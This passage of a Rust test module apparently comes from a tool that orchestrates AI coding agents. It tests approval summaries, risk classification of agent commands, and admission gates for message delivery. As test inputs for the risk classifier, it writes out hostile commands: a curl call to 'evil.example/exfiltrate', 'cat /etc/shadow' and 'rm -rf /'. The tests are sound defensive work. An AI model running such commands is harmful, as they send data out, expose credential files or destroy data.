            "a single huge message must be truncated: {}",
            d.len()
        );
        assert!(d.contains('…'));
    }

    #[test]
    fn truncate_chars_is_utf8_safe_and_idempotent_under_the_limit() {
        assert_eq!(truncate_chars("hello", 10), "hello");
        assert_eq!(truncate_chars("hello", 5), "hello");
        // Multi-byte chars: must count chars, not bytes (would panic/mis-slice on bytes).
        let s = "你好世界你好世界"; // 8 chars
        assert_eq!(truncate_chars(s, 4).chars().count(), 5); // 4 + '…'
        assert!(truncate_chars(s, 4).starts_with("你好世界"));
    }

    #[test]
    fn initialize_metadata_survives_later_bare_init_list() {
        let rich = vec![crate::lead_chat::proto::SlashCmd {
            name: "compact".into(),
            description: Some("Summarize context".into()),
            arg_hint: None,
        }];
        let bare = vec![crate::lead_chat::proto::SlashCmd::bare("compact")];

        let merged = merge_init_slash_commands(&rich, bare);

        assert_eq!(merged, rich);
    }

    #[test]
    fn initialize_merge_adds_new_dynamic_commands() {
        let existing = vec![crate::lead_chat::proto::SlashCmd {
            name: "compact".into(),
            description: Some("Summarize context".into()),
            arg_hint: None,
        }];
        let init = vec![
            crate::lead_chat::proto::SlashCmd::bare("compact"),
            crate::lead_chat::proto::SlashCmd {
                name: "superpowers:requesting-code-review".into(),
                description: Some("Review current work".into()),
                arg_hint: None,
            },
        ];

        let merged = merge_init_slash_commands(&existing, init);

        assert_eq!(merged.len(), 2);
        assert_eq!(merged[0], existing[0]);
        assert_eq!(merged[1].name, "superpowers:requesting-code-review");
    }

    #[tokio::test]
    async fn terminal_error_without_current_row_is_persisted() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        // Real thread row: insert_lead_message refuses deleted/nonexistent
        // threads (the deletion fence).
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();

        let m = insert_terminal_assistant_if_missing(&db, t.id, None, 3, "error")
            .await
            .unwrap()
            .expect("error turn should create an assistant row");

        assert_eq!(m.thread_id, t.id);
        assert_eq!(m.turn_id, 3);
        assert_eq!(m.role, "assistant");
        assert_eq!(m.kind, "text");
        assert_eq!(m.status, "error");
        let content: serde_json::Value = serde_json::from_str(&m.content).unwrap();
        assert_eq!(content["terminal"], "error_before_output");
        let all = repo::list_lead_messages(&db, t.id).await.unwrap();
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].id, m.id);

        let complete = insert_terminal_assistant_if_missing(&db, t.id, None, 4, "complete")
            .await
            .unwrap();
        assert!(complete.is_none());
    }

    #[tokio::test]
    async fn disconnected_busy_turn_without_current_row_persists_terminal_error() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();

        let row = persist_disconnected_turn_row(&db, t.id, None, 3, "error", true, None)
            .await
            .unwrap();

        let all = repo::list_lead_messages(&db, t.id).await.unwrap();
        assert_eq!(all.len(), 1);
        match row {
            Some(DisconnectedTurnRow::Inserted(m)) => assert_eq!(m.id, all[0].id),
            _ => panic!("busy disconnected turn without current should insert terminal row"),
        }
        assert_eq!(all[0].turn_id, 3);
        assert_eq!(all[0].role, "assistant");
        assert_eq!(all[0].status, "error");
        let content: serde_json::Value = serde_json::from_str(&all[0].content).unwrap();
        assert_eq!(content["terminal"], "error_before_output");
    }

    #[test]
    fn codex_change_approval_summary_is_path_specific() {
        // distinct edits get distinct summaries → distinct AskRegistry Always keys.
        let a = codex_change_approval_summary(&serde_json::json!({
            "changes": [{"path": "src/a.rs", "kind": {"type": "edit"}}]
        }));
        let b = codex_change_approval_summary(&serde_json::json!({
            "item": {"changes": [{"path": "src/b.rs"}]}
        }));
        assert_eq!(a.0, "apply file changes: src/a.rs");
        assert_eq!(b.0, "apply file changes: src/b.rs");
        assert_ne!(a.0, b.0);
        assert_eq!(a.1, r#"["src/a.rs"]"#);
        // >3 paths are capped with a +N suffix in the DISPLAY summary...
        let many = codex_change_approval_summary(&serde_json::json!({
            "changes": [{"path":"1"},{"path":"2"},{"path":"3"},{"path":"4"},{"path":"5"}]
        }));
        assert_eq!(many.0, "apply file changes: 1, 2, 3 +2");
        // ...but the FULL path list (used for the action key) keeps every path.
        assert_eq!(many.1, r#"["1","2","3","4","5"]"#);
        // no paths → the generic label (still answerable, just not Always-specific).
        assert_eq!(
            codex_change_approval_summary(&serde_json::json!({})),
            ("apply file changes".to_string(), String::new())
        );
    }

    /// Issue #89's Codex ">3-path edit" acceptance case: two DIFFERENT >3-path
    /// edits can share the SAME capped display summary (first 3 + count), so the
    /// action_key must be built from the full path list, not the summary.
    #[test]
    fn codex_change_approval_full_paths_disambiguate_beyond_the_take3_cap() {
        let a = codex_change_approval_summary(&serde_json::json!({
            "changes": [{"path":"1"},{"path":"2"},{"path":"3"},{"path":"4"}]
        }));
        let b = codex_change_approval_summary(&serde_json::json!({
            "changes": [{"path":"1"},{"path":"2"},{"path":"3"},{"path":"5"}]
        }));
        assert_eq!(
            a.0, b.0,
            "both display as \"apply file changes: 1, 2, 3 +1\""
        );
        // ...but the full (untruncated) list disambiguates them.
        assert_ne!(a.1, b.1);
    }

    /// Issue #89: `codex_approval_fields` produces the (tool, summary, detail,
    /// risk, action_key) quintuple for every approval kind, with `action_key`
    /// always exact even where `summary` truncates for display. issue #101:
    /// `risk` is computed by the same shared `classify_risk` every branch
    /// routes through.
    #[test]
    fn codex_approval_fields_action_key_is_exact_and_summary_may_truncate() {
        // Bash: summary truncates to the first line; action_key carries the full
        // multi-line command (mirrors bus::server::summarize's claude shape).
        let (tool, summary, detail, risk, key) = codex_approval_fields(
            "codex/commandExecution",
            &serde_json::json!({"command": "npm test\nrm -rf /", "cwd": "/repo"}),
        );
        assert_eq!(tool, "Bash");
        assert_eq!(summary, "Run: npm test");
        assert_eq!(detail, "npm test\nrm -rf /");
        assert!(key.contains("rm -rf /"));
        assert_eq!(risk, crate::ask::RiskLevel::Write);
        // A different multi-line command sharing the same first line differs in key.
        let (_, summary2, _, _risk2, key2) = codex_approval_fields(
            "codex/commandExecution",
            &serde_json::json!({"command": "npm test\necho safe"}),
        );
        assert_eq!(summary2, summary);
        assert_ne!(key2, key);

        // Network: keyed by host — network FIRST beats the commandExecution method.
        let (tool, summary, _detail, risk, key) = codex_approval_fields(
            "codex/commandExecution",
            &serde_json::json!({"networkApprovalContext": {"host": "example.com"}}),
        );
        assert_eq!(tool, "Network");
        assert_eq!(summary, "network access: example.com");
        assert_eq!(key, crate::ask::action_key(&["Network", "example.com"]));
        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);

        // Edit: action_key carries the FULL path list even beyond the 3-path cap.
        let (tool, summary, _detail, risk, key) = codex_approval_fields(
            "applyPatchApproval",
            &serde_json::json!({"changes": [{"path":"a"},{"path":"b"},{"path":"c"},{"path":"d"}]}),
        );
        assert_eq!(tool, "Edit");
        assert_eq!(summary, "apply file changes: a, b, c +1");
        assert!(key.contains('d'));
        assert_eq!(risk, crate::ask::RiskLevel::Write);

        // Permission: summary truncates the scope at 120 chars; action_key (and
        // detail) keep it whole. No recognizable marker in the scope → honestly
        // Unknown, never a guessed-safe ReadOnly for a permission ESCALATION.
        let long_scope = "x".repeat(200);
        let (tool, summary, detail, risk, key) = codex_approval_fields(
            "elicitation/permissions",
            &serde_json::json!({"permissions": {"note": long_scope}}),
        );
        assert_eq!(tool, "Permission");
        assert!(summary.len() < detail.len());
        assert_eq!(key, crate::ask::action_key(&["Permission", &detail]));
        assert_eq!(risk, crate::ask::RiskLevel::Unknown);
    }

    /// Same collision class as `bus::server`'s round-2 finding, mirrored on the
    /// codex side for defense in depth: the fixed literal kind tags ("Bash",
    /// "Edit", ...) already make a bare `format!` join safe here in isolation
    /// (no two kinds share a prefix), but routing through the shared
    /// `crate::ask::action_key` helper — rather than re-deriving that argument —
    /// is what actually GUARANTEES it, and keeps both engines' action_keys
    /// built by the same one canonical, provably-injective encoding.
    #[test]
    fn codex_approval_fields_action_key_uses_the_shared_collision_resistant_encoding() {
        let (_, _, _, _risk, bash_key) = codex_approval_fields(
            "codex/commandExecution",
            &serde_json::json!({"command": "echo hi"}),
        );
        assert_eq!(bash_key, crate::ask::action_key(&["Bash", "echo hi"]));
    }

    /// issue #101: a permission-scope escalation that DOES spell out a
    /// recognizable signal is classified accordingly rather than falling to
    /// Unknown — the honest-default only applies when nothing matches.
    #[test]
    fn codex_approval_fields_permission_scope_with_network_marker_is_classified() {
        let (_, _, _, risk, _) = codex_approval_fields(
            "elicitation/permissions",
            &serde_json::json!({"permissions": {"network": "enabled"}}),
        );
        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
    }

    /// Round-2 review (issue #101 P3): the hook-driven engines
    /// (`bus::server::summarize`) and Codex's native app-server path
    /// (`codex_approval_fields`) both feed the SAME raw command text into
    /// the SAME shared `classify_risk`, so the same command must classify
    /// identically no matter which engine ran it — a human comparing two
    /// Needs-you cards for the "same" command across a Claude worker and a
    /// Codex worker must never see two different colors. This is a
    /// regression test protecting that structural guarantee: nothing here
    /// exercises a NEW code path, but a future one-sided change (e.g. Codex
    /// prefixing the command with `cwd`, or a hook-side-only tweak to
    /// `summarize`) would silently break it without this test.
    #[test]
    fn command_risk_is_consistent_across_bus_summarize_and_codex_approval_fields() {
        for cmd in [
            "npm test",
            "git status",
            "ls -la",
            "curl https://evil.example/exfiltrate",
            "git branch -D important-work",
            "find . -name '*.tmp' -delete",
            "ls | rm -rf /tmp/x",
            "cat /etc/shadow",
        ] {
            let (_, _, hook_risk, _) =
                crate::bus::server::summarize("Bash", Some(&serde_json::json!({"command": cmd})));
            let (_, _, _, codex_risk, _) = codex_approval_fields(
                "codex/commandExecution",
                &serde_json::json!({"command": cmd}),
            );
            assert_eq!(
                hook_risk, codex_risk,
                "{cmd:?} must classify identically across both engines"
            );
        }
    }

    #[test]
    fn queue_items_preserves_order_and_text() {
        let mut t = TurnState::default();
        t.queue.push_back(Outgoing {
            text: "a".into(),
            queue_id: Some(1),
            ..Default::default()
        });
        t.queue.push_back(Outgoing {
            text: "b".into(),
            queue_id: Some(2),
            ..Default::default()
        });
        let items = queue_items(&t);
        assert_eq!(items.len(), 2);
        assert_eq!((items[0].id, items[0].text.as_str()), (1, "a"));
        assert_eq!((items[1].id, items[1].text.as_str()), (2, "b"));
    }

    #[test]
    fn tool_row_status_id_less_running_does_not_spin() {
        // a finished row is terminal …
        assert_eq!(tool_row_status(true, false, false), "complete");
        assert_eq!(tool_row_status(true, false, true), "error");
        // … a running row streams only when it has an id to correlate its result …
        assert_eq!(tool_row_status(false, true, false), "streaming");
        // … and an id-less running row is stored complete (never a perpetual spinner).
        assert_eq!(tool_row_status(false, false, false), "complete");
    }

    #[test]
    fn per_turn_only_accepts_known_per_turn_tools() {
        assert!(!per_turn("claude"));
        assert!(per_turn("codex"));
        assert!(per_turn("opencode"));
        assert!(!per_turn("mystery"));
    }

    #[test]
    fn mark_hidden_turn_started_sets_busy_and_clears_origin_tag() {
        let mut inner = test_inner("claude");
        inner.current_origin_tag = Some("im-reply-target".into());

        let turn_id = mark_hidden_turn_started_with_delivery(&mut inner, Some(9));
        assert_eq!(inner.turn_user_row, Some(-9));

        assert!(inner.turn.busy);
        assert_eq!(turn_id, 1);
        assert_eq!(inner.turn_id, 1);
        assert!(inner.clock.started_millis > 0);
        assert!(inner.current_origin_tag.is_none());
    }

    #[test]
    fn durable_hidden_delivery_text_uses_the_stable_source_tag() {
        let row = crate::store::entities::lead_hidden_delivery::Model {
            id: 41,
            thread_id: 1,
            source_kind: "repo_action".into(),
            source_id: 9,
            dedupe_key: "repo_action:9".into(),
            payload: r#"{"tool":"repo_action","status":"ok"}"#.into(),
            state: repo::LEAD_HIDDEN_DELIVERY_PENDING.into(),
            created_at: String::new(),
            updated_at: String::new(),
        };

        assert_eq!(
            durable_hidden_delivery_text(&row).unwrap(),
            "<weft:repo_action>{\"status\":\"ok\",\"tool\":\"repo_action\"}</weft:repo_action>"
        );
    }

    #[test]
    fn durable_hidden_delivery_text_rejects_invalid_rows_before_resume() {
        let malformed = crate::store::entities::lead_hidden_delivery::Model {
            id: 42,
            thread_id: 1,
            source_kind: "repo_action".into(),
            source_id: 9,
            dedupe_key: "repo_action:9".into(),
            payload: "not-json".into(),
            state: repo::LEAD_HIDDEN_DELIVERY_PENDING.into(),
            created_at: String::new(),
            updated_at: String::new(),
        };
        assert!(durable_hidden_delivery_text(&malformed).is_err());

        let unsupported = crate::store::entities::lead_hidden_delivery::Model {
            source_kind: "ephemeral".into(),
            ..malformed
        };
        assert!(durable_hidden_delivery_text(&unsupported).is_err());
    }

    async fn durable_hidden_fixture(tool: &str) -> (Db, EngineRef, i32) {
        static NEXT_TEST_SURFACE_KEY: std::sync::atomic::AtomicI32 =
            std::sync::atomic::AtomicI32::new(900_000);
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let workspace = repo::create_workspace(&db, "admission-gate").await.unwrap();
        let thread = repo::create_thread(&db, workspace.id, "thread", "issue", tool)
            .await
            .unwrap();
        let row = repo::enqueue_lead_hidden_delivery(
            &db,
            thread.id,
            "plan_decision",
            7,
            "plan_decision:7",
            r#"{"tool":"plan_decision","message_id":7}"#,
        )
        .await
        .unwrap();
        let mut inner = test_inner(tool);
        inner.thread_id = thread.id;
        // Keep fixture admission gates disjoint from production-style lead_key
        // values used by the rest of the parallel unit suite. The DB thread id
        // remains the real fixture id so pending-row queries still exercise the
        // production path.
        inner.session_id = Some(
            NEXT_TEST_SURFACE_KEY.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
        );
        (
            db,
            std::sync::Arc::new(tokio::sync::Mutex::new(inner)),
            row.id,
        )
    }

    async fn durable_hidden_fifo_fixture(tool: &str) -> (Db, EngineRef, Vec<i32>) {
        static NEXT_TEST_SURFACE_KEY: std::sync::atomic::AtomicI32 =
            std::sync::atomic::AtomicI32::new(910_000);
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let workspace = repo::create_workspace(&db, "admission-fifo").await.unwrap();
        let thread = repo::create_thread(&db, workspace.id, "thread", "issue", tool)
            .await
            .unwrap();
        let older = repo::enqueue_lead_hidden_delivery(
            &db,
            thread.id,
            "repo_action",
            6,
            "repo_action:6",
            r#"{"tool":"repo_action","status":"ok","execution_id":6}"#,
        )
        .await
        .unwrap();
        let newer = repo::enqueue_lead_hidden_delivery(
            &db,
            thread.id,
            "plan_decision",
            7,
            "plan_decision:7",
            r#"{"tool":"plan_decision","message_id":7}"#,
        )
        .await
        .unwrap();
        let mut inner = test_inner(tool);
        inner.thread_id = thread.id;
        inner.session_id = Some(
            NEXT_TEST_SURFACE_KEY.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
        );
        (
            db,
            Arc::new(tokio::sync::Mutex::new(inner)),
            vec![older.id, newer.id],
        )
    }

    #[tokio::test]
    async fn durable_batch_fifo_keeps_older_repo_before_plan_resume() {
        let (db, eng, ids) = durable_hidden_fifo_fixture("codex").await;
        let mut inner = eng.lock().await;
        inner.stopped = true;
        let rows = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert_eq!(
            rows.iter()
                .map(|(row, _)| row.source_kind.as_str())
                .collect::<Vec<_>>(),
            vec!["repo_action", "plan_decision"]
        );
        assert_eq!(
            rows.iter().map(|(row, _)| row.id).collect::<Vec<_>>(),
            ids
        );
        assert!(durable_batch_may_resume(
            &rows,
            DurableResumeAuthorization::Background
        ));
    }

    #[tokio::test]
    async fn stopped_repo_only_batch_defers_without_resume_authorization() {
        let (db, eng, _delivery_id) = durable_hidden_fixture("claude").await;
        let mut inner = eng.lock().await;
        inner.stopped = true;
        // Replace the fixture's plan row with a repo-action-only batch so this
        // exercises the no-plan background policy directly.
        repo::delete_lead_hidden_deliveries_for_thread(&db, inner.thread_id)
            .await
            .unwrap();
        repo::enqueue_lead_hidden_delivery(
            &db,
            inner.thread_id,
            "repo_action",
            8,
            "repo_action:8",
            r#"{"tool":"repo_action","status":"ok","execution_id":8}"#,
        )
        .await
        .unwrap();
        let rows = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert!(!durable_batch_may_resume(
            &rows,
            DurableResumeAuthorization::Background
        ));
    }

    #[tokio::test]
    async fn failed_batch_restore_is_epoch_guarded() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(test_inner("codex")));
        {
            let mut inner = eng.lock().await;
            inner.stopped = false;
            inner.reset_epoch = 9;
        }

        // A reset/restart that bumped the epoch owns the current state; a
        // stale failed batch must not put it back into stopped mode.
        restore_stopped_after_failed_batch(&db, &eng, true, 8).await;
        assert!(!eng.lock().await.stopped);

        // When the failed batch still owns the epoch, restoring stopped is the
        // expected rollback and remains visible in memory for the next retry.
        restore_stopped_after_failed_batch(&db, &eng, true, 9).await;
        assert!(eng.lock().await.stopped);
    }

    /// The final admission snapshot must trust the durable state, not the
    /// in-memory negative marker. `note_turn_activity` consumes first and
    /// clears that marker only after a later engine re-lock, so a visible send
    /// arriving in between must observe the consumed row and skip it.
    #[tokio::test]
    async fn pending_hidden_admission_skips_consumed_row_with_stale_marker() {
        let (db, eng, delivery_id) = durable_hidden_fixture("codex").await;
        {
            let mut inner = eng.lock().await;
            mark_hidden_turn_started_with_delivery(&mut inner, Some(delivery_id));
            assert_eq!(inner.turn_user_row, Some(-delivery_id));
        }
        repo::consume_lead_hidden_delivery(&db, delivery_id)
            .await
            .unwrap();

        let inner = eng.lock().await;
        let rows = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert!(rows.is_empty(), "consumed DB state is authoritative");
        assert_eq!(inner.turn_user_row, Some(-delivery_id), "marker clear is deferred");
    }

    /// A delete/rewind fence removes the durable row before the visible send's
    /// final recheck. The production snapshot helper must treat the missing row
    /// exactly like `consumed`, even if a stale queue marker remains in memory.
    #[tokio::test]
    async fn pending_hidden_admission_skips_deleted_row_with_stale_marker() {
        let (db, eng, delivery_id) = durable_hidden_fixture("opencode").await;
        {
            let mut inner = eng.lock().await;
            mark_hidden_turn_started_with_delivery(&mut inner, Some(delivery_id));
        }
        repo::delete_lead_hidden_deliveries_for_thread(&db, eng.lock().await.thread_id)
            .await
            .unwrap();

        let inner = eng.lock().await;
        let rows = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert!(rows.is_empty(), "deleted DB state is authoritative");
    }

    /// The journal enqueue path uses the same production admission-gate
    /// primitive as plan decisions and visible sends (`with_admission_gate`
    /// for the short DB transaction, an owned guard for `send`). A visible
    /// Phase-1 barrier therefore absorbs rows inserted before it and lets rows
    /// inserted after it linearize as a later follow-up, never interleaving in
    /// the middle.
    #[tokio::test]
    async fn durable_enqueue_waits_for_visible_admission_barrier() {
        let (db, eng, _old_id) = durable_hidden_fixture("codex").await;
        let (key, thread_id) = {
            let inner = eng.lock().await;
            (
                inner
                    .session_id
                    .map(i64::from)
                    .expect("fixture assigns an isolated surface key"),
                inner.thread_id,
            )
        };
        let serial = admission_gate_for_key(key).lock_owned().await;
        let db_for_enqueue = db.clone();
        let (started_tx, mut started_rx) = tokio::sync::oneshot::channel();
        let enqueue = tokio::spawn(async move {
            with_admission_gate(key, || async move {
                let _ = started_tx.send(());
                repo::enqueue_lead_hidden_delivery(
                    &db_for_enqueue,
                    thread_id,
                    "plan_decision",
                    8,
                    "plan_decision:8",
                    r#"{"tool":"plan_decision","message_id":8}"#,
                )
                .await
            })
            .await
        });
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut started_rx)
                .await
                .is_err(),
            "enqueue must wait while visible Phase 1 owns the gate"
        );
        drop(serial);
        started_rx.await.unwrap();
        let inserted = enqueue.await.unwrap().unwrap();
        assert_eq!(inserted.source_id, 8);

        let inner = eng.lock().await;
        let rows = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert_eq!(
            rows.iter().map(|(row, _)| row.source_id).collect::<Vec<_>>(),
            vec![7, 8],
            "the later enqueue is FIFO after the already-pending row"
        );
    }

    /// Hidden per-turn/ACP/Codex spawn completion is part of the same serial
    /// admission scope. This barrier test injects a spawn result at the
    /// production gate seam: a visible send cannot pass while spawn is pending,
    /// and it is released only after the failure has rolled back.
    #[tokio::test]
    async fn admission_gate_blocks_visible_send_until_hidden_spawn_result() {
        let key = -9_001_337_i64;
        let gate = admission_gate_for_key(key);
        let (spawn_started_tx, spawn_started_rx) = tokio::sync::oneshot::channel();
        let (spawn_release_tx, spawn_release_rx) = tokio::sync::oneshot::channel();
        let hidden = tokio::spawn(async move {
            let result: anyhow::Result<()> = with_admission_gate(key, || async move {
                let _ = spawn_started_tx.send(());
                let _ = spawn_release_rx.await;
                anyhow::bail!("injected spawn failure")
            })
            .await;
            result
        });
        spawn_started_rx.await.unwrap();

        let (visible_tx, mut visible_rx) = tokio::sync::oneshot::channel();
        let visible = tokio::spawn(async move {
            with_admission_gate(key, || async move {
                let _ = visible_tx.send(());
            })
            .await;
        });
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut visible_rx)
                .await
                .is_err(),
            "visible admission must wait for the hidden spawn result"
        );
        spawn_release_tx.send(()).unwrap();
        assert!(hidden.await.unwrap().is_err());
        visible.await.unwrap();
        visible_rx.await.unwrap();
        drop(gate);
    }

    /// Resident stdin write failures have the same ordering guarantee as a
    /// per-turn spawn failure: the visible gate remains held until rollback
    /// finishes, so no promotion/direct dispatch can race the failed turn.
    #[tokio::test]
    async fn admission_gate_blocks_visible_send_until_resident_write_result() {
        let key = -9_001_338_i64;
        let (write_started_tx, write_started_rx) = tokio::sync::oneshot::channel();
        let (write_release_tx, write_release_rx) = tokio::sync::oneshot::channel();
        let resident = tokio::spawn(async move {
            let result: anyhow::Result<()> = with_admission_gate(key, || async move {
                let _ = write_started_tx.send(());
                let _ = write_release_rx.await;
                anyhow::bail!("injected resident write failure")
            })
            .await;
            result
        });
        write_started_rx.await.unwrap();

        let (visible_tx, mut visible_rx) = tokio::sync::oneshot::channel();
        let visible = tokio::spawn(async move {
            with_admission_gate(key, || async move {
                let _ = visible_tx.send(());
            })
            .await;
        });
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut visible_rx)
                .await
                .is_err(),
            "visible admission must wait for the resident write result"
        );
        write_release_tx.send(()).unwrap();
        assert!(resident.await.unwrap().is_err());
        visible.await.unwrap();
        visible_rx.await.unwrap();
    }

    #[tokio::test]
    async fn stop_quiet_waits_for_durable_batch_admission_gate() {
        let key = -9_001_342_i64;
        let mut inner = test_inner("codex");
        inner.session_id = Some(key as i32);
        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));
        let serial = admission_gate_for_key(key).lock_owned().await;
        let (stopped_tx, mut stopped_rx) = tokio::sync::oneshot::channel();
        let eng_for_stop = eng.clone();
        let stop_task = tokio::spawn(async move {
            let outcome = stop_quiet(&eng_for_stop).await;
            let _ = stopped_tx.send(outcome.was_busy);
        });
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut stopped_rx)
                .await
                .is_err(),
            "stop must not interleave with a durable batch holding the gate"
        );
        drop(serial);
        stop_task.await.unwrap();
        stopped_rx.await.unwrap();
    }

    /// The static map reuses one gate while any admission guard is live, so a
    /// same-key hidden activity task cannot acquire a second mutex and run in
    /// parallel. Weak values plus pruning then allow abandoned keys to be
    /// collected instead of growing forever.
    #[tokio::test]
    async fn same_admission_key_reuses_one_gate_and_serializes_activity() {
        let key = -9_001_339_i64;
        let first = admission_gate_for_key(key);
        let second = admission_gate_for_key(key);
        assert!(Arc::ptr_eq(&first, &second));
        let guard = first.clone().lock_owned().await;
        let (activity_tx, mut activity_rx) = tokio::sync::oneshot::channel();
        let activity = tokio::spawn(async move {
            with_admission_gate(key, || async move {
                let _ = activity_tx.send(());
            })
            .await;
        });
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut activity_rx)
                .await
                .is_err(),
            "same-key activity must not run under a second gate"
        );
        drop(guard);
        activity.await.unwrap();
        activity_rx.await.unwrap();
        drop(first);
        drop(second);
        // The expired Weak remains only until the next gate lookup; that
        // lookup prunes it under the DashMap shard lock without deleting a
        // concurrently recreated live gate.
        let replacement = admission_gate_for_key(key + 1);
        assert!(
            !ENGINE_ADMISSION_GATES
                .get()
                .is_some_and(|gates| gates.contains_key(&key)),
            "expired key must be reclaimed"
        );
        drop(replacement);
    }

    #[test]
    fn durable_hidden_rows_stay_ahead_of_visible_queue_for_both_transports() {
        for tool in ["claude", "opencode"] {
            let mut inner = test_inner(tool);
            inner.turn.busy = true;
            inner.turn_user_row = Some(-10);
            inner.turn.queue.push_back(Outgoing {
                text: "second repo feedback".into(),
                origin_tag: Some(hidden_delivery_tag(11)),
                ..Default::default()
            });
            inner.turn.queue.push_back(Outgoing {
                text: "visible user message".into(),
                tracked: true,
                queue_id: Some(99),
                ..Default::default()
            });

            assert_eq!(inner.turn_user_row, Some(-10), "{tool}: first hidden turn");
            assert!(hidden_delivery_is_duplicate(&inner, 10), "{tool}: current idempotence");
            assert!(hidden_delivery_is_duplicate(&inner, 11), "{tool}: queued idempotence");
            assert!(!hidden_delivery_is_duplicate(&inner, 12), "{tool}: new id admitted");
            assert_eq!(
                inner.turn.queue[0].origin_tag.as_deref(),
                Some(hidden_delivery_tag(11).as_str()),
                "{tool}: durable row order"
            );
            assert_eq!(inner.turn.queue[1].queue_id, Some(99), "{tool}: visible follows");
        }
    }

    /// A hidden turn can observe activity before its receipt worker gets to
    /// finish: TurnEnd is intentionally not gated and may clear `turn_user_row`
    /// in that window, but the synchronous in-flight token must still make the
    /// pending row a duplicate until the detached DB worker reports its result
    /// and the short cleanup gate runs.
    #[tokio::test]
    async fn inflight_hidden_receipt_survives_turn_end_and_blocks_replay() {
        let (db, eng, delivery_id) = durable_hidden_fixture("codex").await;
        let key = eng
            .lock()
            .await
            .session_id
            .map(i64::from)
            .expect("fixture assigns an isolated surface key");
        let serial = admission_gate_for_key(key).lock_owned().await;
        {
            let mut inner = eng.lock().await;
            mark_hidden_turn_started_with_delivery(&mut inner, Some(delivery_id));
            assert!(register_hidden_receipt(&mut inner, delivery_id));
            let next = inner.turn.on_turn_end();
            assert!(next.is_none(), "fixture has no queued follow-up");
            advance_dequeued_turn(&mut inner, &next);
            assert_eq!(inner.turn_user_row, None, "TurnEnd clears the marker");
            assert!(
                hidden_delivery_is_duplicate(&inner, delivery_id),
                "the in-flight token is the durable admission reservation"
            );
        }

        let (started_tx, started_rx) = tokio::sync::oneshot::channel();
        let (release_tx, release_rx) = tokio::sync::oneshot::channel();
        let (committed_tx, committed_rx) = tokio::sync::oneshot::channel();
        let db_for_receipt = db.clone();
        let eng_for_receipt = eng.clone();
        let receipt = tokio::spawn(run_hidden_receipt_worker(
            db.clone(),
            eng_for_receipt,
            key,
            delivery_id,
            eng.lock().await.hidden_receipt_inflight.clone(),
            async move {
                let _ = started_tx.send(());
                let _ = release_rx.await;
                let outcome = repo::consume_lead_hidden_delivery(&db_for_receipt, delivery_id).await;
                let _ = committed_tx.send(());
                outcome
            },
            std::time::Duration::from_secs(60),
            None,
        ));
        started_rx.await.unwrap();

        let inner = eng.lock().await;
        assert!(hidden_delivery_is_duplicate(&inner, delivery_id));
        let pending = pending_hidden_rows_at_admission(&db, &inner).await.unwrap();
        assert_eq!(pending.len(), 1, "the durable row remains pending while DB is blocked");
        drop(inner);

        // The DB future is independent of the admission gate. Once released it
        // can commit while the gate is still held, but the shared token remains
        // until the worker gets the short gate+engine cleanup turn.
        release_tx.send(()).unwrap();
        committed_rx.await.unwrap();
        let inner = eng.lock().await;
        assert!(hidden_delivery_is_duplicate(&inner, delivery_id));
        assert!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .is_empty(),
            "DB consumption may commit before cleanup gate admission"
        );
        drop(inner);
        drop(serial);

        receipt.await.unwrap();
        let inner = eng.lock().await;
        assert!(!inner.hidden_receipt_inflight.contains(&delivery_id));
        assert!(!hidden_delivery_is_duplicate(&inner, delivery_id));
        assert!(pending_hidden_rows_at_admission(&db, &inner)
            .await
            .unwrap()
            .is_empty());
    }

    /// The warning/watch task must never cancel the DB worker. While a
    /// controllable consume future is blocked, the short admission gate remains
    /// usable by visible work, but the shared receipt token still blocks a
    /// duplicate. Only the definitive DB result permits cleanup and retry.
    #[tokio::test]
    async fn hidden_receipt_warning_keeps_token_until_db_outcome() {
        let (db, eng, delivery_id) = durable_hidden_fixture("codex").await;
        let key = eng
            .lock()
            .await
            .session_id
            .map(i64::from)
            .expect("fixture assigns an isolated surface key");
        let registry = {
            let mut inner = eng.lock().await;
            mark_hidden_turn_started_with_delivery(&mut inner, Some(delivery_id));
            assert!(register_hidden_receipt(&mut inner, delivery_id));
            inner.hidden_receipt_inflight.clone()
        };
        let (started_tx, started_rx) = tokio::sync::oneshot::channel();
        let (release_tx, release_rx) = tokio::sync::oneshot::channel();
        let (warning_tx, warning_rx) = tokio::sync::oneshot::channel();
        let db_for_worker = db.clone();
        let worker = tokio::spawn(run_hidden_receipt_worker(
            db.clone(),
            eng.clone(),
            key,
            delivery_id,
            registry,
            async move {
                let _ = started_tx.send(());
                let _ = release_rx.await;
                repo::consume_lead_hidden_delivery(&db_for_worker, delivery_id).await
            },
            std::time::Duration::from_millis(1),
            Some(warning_tx),
        ));

        started_rx.await.unwrap();
        tokio::time::timeout(std::time::Duration::from_millis(100), warning_rx)
            .await
            .expect("warning should fire while the DB future is blocked")
            .expect("warning sender should remain connected");

        // The worker is not holding the gate while it waits on SQLite, and the
        // token remains an idempotence fence until the outcome is known.
        with_admission_gate(key, || async {}).await;
        let inner = eng.lock().await;
        assert!(hidden_delivery_is_duplicate(&inner, delivery_id));
